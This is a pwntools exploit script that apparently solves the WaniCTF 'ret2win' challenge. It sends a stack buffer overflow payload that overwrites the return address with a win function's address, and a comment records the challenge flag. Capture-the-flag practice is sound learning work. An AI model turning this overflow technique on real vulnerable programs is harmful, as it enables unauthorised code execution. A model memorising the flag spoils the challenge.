from pwn import *
# for context
context.log_level = 'debug'
# for remote
host = 'ret2win-pwn.wanictf.org'
port = 9003 
io = None
# for local
exe = context.binary = ELF("./chall")
# libc = ELF("./solution/libc.so.6")

# address or value for exploit 
win = 0x000000000401369 # win function

def start():
    if not args.R:
        return process([exe.path])
    else:
        return remote(host, port)
def exploit(io):
    io.recvuntil(' > ')
    io.sendline(b'A'*0x28+p64(win))
    io.interactive()

io = start()
exploit(io)
# FLAG{f1r57_5739_45_4_9wn3r}

